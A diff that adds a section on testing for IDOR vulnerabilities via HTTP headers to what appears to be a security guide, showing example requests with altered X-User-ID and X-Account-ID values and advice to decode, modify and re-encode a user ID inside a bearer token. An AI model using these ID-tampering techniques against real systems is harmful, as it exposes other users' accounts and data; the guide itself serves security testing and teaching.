@@ -183,6 +183,25 @@ IDOR (Insecure Direct Object References) is a type of access control vulnerabili
 
 ---
 
+### Testing for IDOR in HTTP headers
+```json
+# User-ID in custom headers
+GET /api/profile HTTP/1.1
+X-User-ID: 123
+X-Account-ID: 456
+
+# Try modifying header values
+GET /api/profile HTTP/1.1
+X-User-ID: 124
+X-Account-ID: 457
+
+# Authorization tokens with embedded IDs
+Authorization: Bearer eyJ1c2VyX2lkIjoxMjN9...
+# Decode, modify user_id, re-encode
+```
+
+---
+
 ## Prevention and Mitigation
 
 1. **Continuous user permission validation**  
